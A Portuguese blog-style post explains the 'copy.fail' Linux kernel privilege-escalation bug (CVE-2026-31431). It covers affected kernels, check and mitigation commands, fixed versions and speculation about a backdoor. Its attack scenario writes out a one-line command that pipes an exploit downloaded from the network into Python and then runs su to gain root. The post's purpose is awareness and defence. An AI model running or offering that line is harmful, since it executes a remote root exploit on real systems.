# copy.fail é a maior vulnerabilidade do Linux em muito tempo 🐧 ❌

Uma otimização de código de 2017 que economizava uma cópia de memória introduziu um bug sutil que só foi corrigido agora em Abril de 2026. Um script Python de 732 bytes que funciona de primeira em basicamente todas as distros Linux. Vamos falar sobre.

Mas a dúvida que fica é… será que o Rust teria previnido esse bug?

- Esse é um bug que permite qualquer usuário normal numa máquina com o kernel do Linux rodando escalar os seus privilégios para administrador e foi descoberto por pesquisadores de uma empresa chamada Theori
  - É muito sério. Rodou esse script, conseguiu shell como root, pode instalar pacotes, fazer o que quiser com a máquina…
  - E sim, aparentemente esse é mais um exploit que foi encotrado com a ajuda de IA, embora o pesquisador diga que o insight inicial partiu de tentar explorar a mesma área que outros exploits já tinham sido encontrados

[https://copy.fail/](https://copy.fail/ (preview))

- O site original falando da vulnerabilidade é ruim:
  - o texto parece slop de IA e usa linguagem florida e de marketing, nos primeiros momentos algumas pessoas não levaram isso a sério
  - é bem difícil entender se você está afetado pelo exploit (provavelmente sim) e a maneira de testar é “roda ele aí no seu computador”
  - essa coisa de baixar o script e fazer um pipe pro bash é uma péssima prática no geral, agora imagina fazer isso com um script que explora uma vulnerabilidade na tua máquina
  - depois de rodar a vuln o seu computador vai ficar com a cópia batizada do ‘su’ na cache e você precisa droppar ela ou reiniciar, por isso não rode esse exploit e continue usando seu computador

- Mas dito isso: é 100% real, um bug de lógica seríssimo e que permite alguém que tenha acesso local à máquina (ou consiga por ‘remote code execution’) ganhar controle total sobre ela

[https://xint.io/blog/copy-fail-linux-distributions](https://xint.io/blog/copy-fail-linux-distributions (preview))

- Eu não vou conseguir explicar isso tecnicamente muito bem, é algo muito parecido com o Dirty Pipe de 2022.

- Dessa vez o uso do socket AF_ALG, uma API de criptografia que o kernel expõe para usuários sem privilégio, com um problema de escrita ‘out of bounds’. Esse erro de lógica permite que se corrompa bytes da cache do kernel.
- Tentando-se carregar um programa que roda como admin, por exemplo o su e corrompendo a sua cache em memória é possível rodar o su corrompido e escalar para root sem saber a senha

### Meu sistema é afetado? Como corrigir? Como mitigar?

- Todos os kernels a partir de 2017 e antes da versão 7 são vulneráveis. Isso é basicamente todo mundo que não é MUITO DESATUALIZADO ou MUITO ATUALIZADO.

- Ao invés de rodar o exploit diretamente é possível fazer esses testes para ver se o módulo que implementa essa criptografia está ativado:

- Ver se o módulo existe no seu kernel: modinfo algif_aead     
- Ver se está carregado: lsmod | grep algif     
- Ver se pode ser carregado dinamicamente (se imprimir 0): cat /proc/sys/kernel/modules_disabled

- Atualizar para estas versões deve corrigir o exploit:

```
7.0+     
6.19.12     
6.18.22     
6.12.85     
6.6.137     
6.1.170     
5.15.204     
5.10.254     
```

- Se não for possível atualizar, impedir que o módulo algif_aead carregue no kernel é uma solução. Por exemplo no Ubuntu é uma atualização do kmod que impede esse carregamento que solucionou o problema. Em distros como o RedHat e Fedora o módulo vem compilado por padrão e daí é preciso atualizar ou usar um parâmetro de boot.

- Mitigação impedindo que o módulo seja carregado:

> ```
> echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/manual-disable-algif_aead.conf
> ```

- Descarrega o módulo se presente:

```
sudo rmmod algif_aead 2>/dev/null 
```

- Se você rodou o exploit e está com o su batizado na sua cache, rodar esse comando (como root) droppa as páginas de cache do kernel:

```
echo 3 > /proc/sys/vm/drop_caches
```

- Links para o acompanhamento nas diversas distros:
  - Ubuntu: https://ubuntu.com/security/CVE-2026-31431
  - Debian: https://security-tracker.debian.org/tracker/CVE-2026-31431     
  - Suse: https://www.suse.com/security/cve/CVE-2026-31431.html     
  - Arch: https://security.archlinux.org/CVE-2026-31431
  - RedHat: https://access.redhat.com/security/cve/cve-2026-31431     

### Esse é um dos exploits mais perigosos que já rolaram:

- A maneira que ele é explorado é imediata, portável e funciona 100% das vezes (alguns outros exploits exploravam condições de corrida ou situações anômalas)

- Não deixa rastros no disco e na maioria das ferramentas de monitoramento ou mitigação não vai pegar ele (aparentemente o SELinux pega)

- Isso quer dizer que ele pode estar sendo explorado por aí de uma maneira silenciosa

- O mecanismo de páginas de cache que é explorado nisso é compartilhado entre pods e o  host. Isso quer dizer que é possível escalar o privilégio de dentro de um docker ou kubernetes 🤡

- Então aqui vai um cenário realista de ataque:
  - Atacante explora uma falha num WordPress plugin rodando dentro de um pod
  - Ganha shell como www-data
  - Executa curl https://copy.fail/exp | python3 && su
  - Vira root no host Kubernetes
  - Invade os outros pods, rouba credenciais, espalha ransomware …

- Fora isso, alguém com acesso local à sua máquina conseguiria root sem senha.

- Eu preciso lembrar vocês que nós estamos na era dos malwares distribuídos pela cadeia de suprimentos? Isso quer dizer que a falha do Axios ou do LiteLLM poderia só rodar esse script e conseguir permissão de administrador nas máquinas

### Coisas estranhas…

- Uma coisa estranha rolou, o site do Ubuntu levou um DDOS bem na hora que o bug foi revelado… tentativa de atrasar a mitigação para o público em geral?

- Isso foi avisado pra equipe do kernel em Março e uma fix 23/03/26, algumas distros como o debian demoraram até depois do disclosure… por que?

- Agora se me permitem botar o meu chapéu especulativo… esse comentário aqui que eu li numa thread do Reddit vai certeiro em algo importantíssimo:

> this crypto API has virtually no use for 99.99% of people and for  the 0.01% there's even a fallback alternative. Why is it on by default?     
>
> What are the chances this was an intentional backdoor ? I know,  you need a local user account, still super effective and nearly  traceless escalation to su     

- Vocês devem lembrar do bug da lib xz em que um indivíduo, potencialmente de alguma agência de inteligência, quase conseguiu colocar um backdoor em todos servidores Linux por meio da biblioteca de compressão do ssh…

- Qual a chance de isso ser intencional? Pode ser pequena, mas qual a chance de que isso estava sendo utilizado a rodo por aí? Essa é a parte que faz a gente perder um pouco o sono

- Mas é isso, atualizem seus kernels ou rodem as mitigações e bora pra frente que a semana vai ser longa.
